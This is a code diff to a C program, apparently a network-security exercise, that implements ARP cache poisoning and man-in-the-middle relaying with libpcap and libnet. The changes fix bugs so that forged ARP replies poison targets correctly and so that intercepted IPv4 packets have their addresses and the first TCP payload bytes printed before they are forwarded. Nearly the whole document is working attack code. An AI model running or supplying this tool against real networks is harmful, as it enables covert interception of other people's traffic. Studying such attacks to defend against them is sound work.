@@ -9,7 +9,7 @@
 void *infect(void *arg){
     struct spoof_arg *my_arg=(spoof_arg *)arg;
     for(int i=0;i<10;i++) {
-        arp_reply(my_arg->handle, my_arg->src_ip, my_arg->dst_ip, my_arg->my_mac, my_arg->src_mac);
+        arp_reply(my_arg->handle, my_arg->dst_ip, my_arg->src_ip, my_arg->my_mac, my_arg->src_mac);
     }
     sleep(infect_time);
 }
@@ -20,7 +20,7 @@ void f_arpspoof(pcap_t *handle,spoof_arg *sa,int pair){
         res=spoof_packet(handle,sa, pair);
         if(res==-1)
             break;
-        puts("-----------------------------------------------");
+        //puts("-----------------------------------------------");
     }
 }
 
@@ -31,7 +31,7 @@ bool spoof_packet(pcap_t* handle,spoof_arg *sa,int pair){
     struct libnet_ethernet_hdr *eth_h;
     struct libnet_ipv4_hdr *ipv4_h;
     struct libnet_tcp_hdr *tcp_hdr;
-    int i;
+    int i,j;
     int data_loc,len;
     char ipbuf[INET_ADDRSTRLEN];
 
@@ -47,13 +47,13 @@ bool spoof_packet(pcap_t* handle,spoof_arg *sa,int pair){
     for(i=0;i<pair;i++) {
         if (!memcmp(eth_h->ether_shost, sa[i].src_mac, 6) && !memcmp(eth_h->ether_dhost, sa[i].my_mac, 6)) {
             //spoofed packet
-
+            puts("spoofed");
             //analyze packet
-            if(ntohs(eth_h->ether_type) != ETHERTYPE_IP) {
+            if(ntohs(eth_h->ether_type) == ETHERTYPE_IP) {
                 ipv4_h=(libnet_ipv4_hdr*)(packet+LIBNET_ETH_H);
-                printf("from");
+                printf("from ");
                 print_ip(sa[i].src_ip);
-                printf("to");
+                printf("to ");
                 print_ip(sa[i].dst_ip);
                 if (ipv4_h->ip_p == IPPROTO_TCP) {
                     tcp_hdr = (libnet_tcp_hdr *) (packet + LIBNET_IPV4_H + LIBNET_ETH_H);
@@ -64,17 +64,19 @@ bool spoof_packet(pcap_t* handle,spoof_arg *sa,int pair){
                     if (len > 16) {
                         len = 16;
                     }
-                    for (i = data_loc; i < data_loc + len; i++) {
-                        printf("%hhx ", *(packet + i));
+                    for (j = data_loc; j < data_loc + len; j++) {
+                        printf("%hhx ", *(packet + j));
                     }
 
                 }
             }
+            puts("");
             //relay packet
-            memcpy(eth_h->ether_shost, sa[i].my_mac, ETHER_ADDR_LEN);
-            memcpy(eth_h->ether_dhost, sa[i].dst_mac, ETHER_ADDR_LEN);
+            memcpy(&eth_h->ether_shost, sa[i].my_mac, ETHER_ADDR_LEN);
+            memcpy(&eth_h->ether_dhost, sa[i].dst_mac, ETHER_ADDR_LEN);
             pcap_sendpacket(handle, packet, header->len);
-            break;
+            return 1;
+
         }
     }
 
